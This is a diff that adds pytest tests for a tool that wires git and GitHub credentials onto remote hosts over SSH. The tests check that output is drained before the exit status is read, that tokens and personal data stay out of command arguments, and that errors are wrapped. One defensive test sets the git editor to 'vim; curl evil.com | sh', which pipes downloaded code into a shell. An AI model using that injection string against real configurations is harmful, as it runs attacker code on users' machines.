@@ -25,6 +25,7 @@ from __future__ import annotations
 
 from unittest.mock import MagicMock
 
+import paramiko
 import pytest
 
 from clawrium.core.lifecycle_canonical import (
@@ -116,6 +117,23 @@ def test_render_gitconfig_body_strips_crlf_and_null_for_injection_defense():
     assert "\n[credential]" not in body
     assert "\r" not in body
     assert "\x00" not in body
+
+
+def test_render_gitconfig_body_strips_shell_metachars_from_core_editor():
+    """GIT_CORE_EDITOR is invoked by git via `sh -c '<editor> <file>'`, so
+    a tampered secrets store with shell metacharacters could execute
+    arbitrary code as the agent user the next time git opens an editor."""
+    body = _render_gitconfig_body({
+        "GIT_CORE_EDITOR": "vim; curl evil.com | sh",
+    })
+    editor_line = next(
+        line for line in body.splitlines() if line.strip().startswith("editor")
+    )
+    for meta in (";", "|", "&", "`", "$", "(", ")", "<", ">", "\\"):
+        assert meta not in editor_line, (
+            f"shell metachar {meta!r} leaked into rendered editor line: "
+            f"{editor_line!r}"
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -370,3 +388,211 @@ def test_stdout_stderr_drained_before_recv_exit_status():
     # Both reads must complete before recv_exit_status.
     assert call_order.index("stdout.read") < call_order.index("recv_exit_status")
     assert call_order.index("stderr.read") < call_order.index("recv_exit_status")
+
+
+def test_stdout_stderr_drained_before_recv_for_github_login_and_setup_git():
+    """Same drain-before-recv invariant, but for the github path.
+
+    `gh auth login --with-token` and `gh auth setup-git` are the chatty
+    calls most likely to fill the ~64KB SSH pipe buffer (login banner,
+    setup-git advice output). Both must drain both pipes before
+    recv_exit_status."""
+    client = MagicMock()
+    call_orders: list[list[str]] = []
+
+    def _mk_stub(idx: int):
+        stdin = MagicMock()
+        out = MagicMock()
+        err = MagicMock()
+        order: list[str] = []
+        call_orders.append(order)
+
+        def _read_out():
+            order.append("stdout.read")
+            return b""
+
+        def _read_err():
+            order.append("stderr.read")
+            return b""
+
+        def _recv():
+            order.append("recv_exit_status")
+            return 0
+
+        out.read.side_effect = _read_out
+        err.read.side_effect = _read_err
+        out.channel.recv_exit_status.side_effect = _recv
+        return (stdin, out, err)
+
+    client.exec_command.side_effect = [_mk_stub(0), _mk_stub(1)]
+    _setup_github_integration(
+        client,
+        "alpha",
+        host={"os_family": "linux"},
+        inputs=_inputs(_github_integration()),
+    )
+    # Both the login and the setup-git call orders must drain first.
+    for order in call_orders:
+        assert order.index("stdout.read") < order.index("recv_exit_status")
+        assert order.index("stderr.read") < order.index("recv_exit_status")
+
+
+# ---------------------------------------------------------------------------
+# Whitespace-only token → clean error
+# ---------------------------------------------------------------------------
+
+
+def test_github_integration_whitespace_only_token_raises_clean_error():
+    """A whitespace-only token is truthy under `if not token:` but
+    meaningless. Guard should treat it as missing rather than piping
+    whitespace to `gh auth login` and surfacing a confusing gh-side
+    error."""
+    client = MagicMock()
+    bad = IntegrationInputs(
+        name="ws-github", type="github", credentials=(("GITHUB_TOKEN", "   "),)
+    )
+    with pytest.raises(CanonicalSyncError, match="GITHUB_TOKEN credential is missing"):
+        _setup_github_integration(
+            client,
+            "alpha",
+            host={"os_family": "linux"},
+            inputs=_inputs(bad),
+        )
+    client.exec_command.assert_not_called()
+
+
+# ---------------------------------------------------------------------------
+# on_event exercised on both paths
+# ---------------------------------------------------------------------------
+
+
+def test_on_event_fires_for_git_and_github_paths():
+    client = MagicMock()
+    client.exec_command.side_effect = [
+        _exec_stub(0),  # git tee
+        _exec_stub(0),  # gh auth login
+        _exec_stub(0),  # gh auth setup-git
+    ]
+    on_event = MagicMock()
+    _setup_github_integration(
+        client,
+        "alpha",
+        host={"os_family": "linux"},
+        inputs=_inputs(_git_integration("id"), _github_integration("gh1")),
+        on_event=on_event,
+    )
+    # Two events: one for git write, one for github wiring.
+    assert on_event.call_count == 2
+    kinds = [c.args[0] for c in on_event.call_args_list]
+    messages = [c.args[1] for c in on_event.call_args_list]
+    assert kinds == ["github_integration", "github_integration"]
+    assert "'id'" in messages[0]
+    assert "'gh1'" in messages[1]
+
+
+# ---------------------------------------------------------------------------
+# Idempotency
+# ---------------------------------------------------------------------------
+
+
+def test_idempotent_second_call_same_ssh_pattern():
+    """Docstring claims idempotency without a sentinel-skip path. Calling
+    the hook twice against a client scripted for both invocations must
+    produce the same exec_command shape both times — protects against a
+    future skip-path regression (#437 pattern)."""
+    client = MagicMock()
+    # 3 execs per call × 2 calls = 6 stubs.
+    client.exec_command.side_effect = [_exec_stub(0) for _ in range(6)]
+    for _ in range(2):
+        _setup_github_integration(
+            client,
+            "alpha",
+            host={"os_family": "linux"},
+            inputs=_inputs(_git_integration(), _github_integration()),
+        )
+    assert client.exec_command.call_count == 6
+    first_call_cmds = [c.args[0] for c in client.exec_command.call_args_list[:3]]
+    second_call_cmds = [c.args[0] for c in client.exec_command.call_args_list[3:]]
+    assert first_call_cmds == second_call_cmds
+
+
+# ---------------------------------------------------------------------------
+# Secrets and PII never in argv (only in stdin / rendered body)
+# ---------------------------------------------------------------------------
+
+
+def test_github_token_never_appears_in_exec_command_argv():
+    """Token must arrive via stdin, never via the command string that
+    ends up in ps/audit logs."""
+    client = MagicMock()
+    client.exec_command.side_effect = [_exec_stub(0), _exec_stub(0)]
+    _setup_github_integration(
+        client,
+        "alpha",
+        host={"os_family": "linux"},
+        inputs=_inputs(_github_integration(token="ghp_verysecret_deadbeef")),
+    )
+    for call in client.exec_command.call_args_list:
+        cmd = call.args[0]
+        assert "ghp_verysecret_deadbeef" not in cmd, (
+            f"token leaked into exec_command argv: {cmd!r}"
+        )
+
+
+def test_gitconfig_pii_never_appears_in_exec_command_argv():
+    """GIT_USER_NAME / GIT_USER_EMAIL must arrive via stdin. The old
+    Ansible task carried `no_log: true` to keep PII out of run logs;
+    the Python path must keep the same invariant by staying out of
+    exec_command argv (which flows to structured event / debug logs)."""
+    client = MagicMock()
+    client.exec_command.return_value = _exec_stub(0)
+    _setup_github_integration(
+        client,
+        "alpha",
+        host={"os_family": "linux"},
+        inputs=_inputs(_git_integration(
+            GIT_USER_NAME="Alice Confidential",
+            GIT_USER_EMAIL="alice.confidential@example.com",
+        )),
+    )
+    for call in client.exec_command.call_args_list:
+        cmd = call.args[0]
+        assert "Alice Confidential" not in cmd
+        assert "alice.confidential@example.com" not in cmd
+
+
+# ---------------------------------------------------------------------------
+# Transport errors surface as CanonicalSyncError (not raw paramiko)
+# ---------------------------------------------------------------------------
+
+
+def test_ssh_exception_wrapped_as_canonical_sync_error():
+    """paramiko.SSHException from exec_command must be caught and
+    re-raised as CanonicalSyncError so the hook's failure surface is
+    uniform with its own exit-code branches. Otherwise raw transport
+    errors bypass the module's error contract."""
+    client = MagicMock()
+    client.exec_command.side_effect = paramiko.SSHException("channel reset")
+    with pytest.raises(CanonicalSyncError, match="SSH transport error"):
+        _setup_github_integration(
+            client,
+            "alpha",
+            host={"os_family": "linux"},
+            inputs=_inputs(_git_integration()),
+        )
+
+
+def test_socket_timeout_wrapped_as_canonical_sync_error():
+    """socket.timeout (a subclass of OSError) from paramiko must also
+    normalize into CanonicalSyncError."""
+    import socket
+
+    client = MagicMock()
+    client.exec_command.side_effect = socket.timeout("gh auth login stalled")
+    with pytest.raises(CanonicalSyncError, match="SSH transport error"):
+        _setup_github_integration(
+            client,
+            "alpha",
+            host={"os_family": "linux"},
+            inputs=_inputs(_github_integration()),
+        )
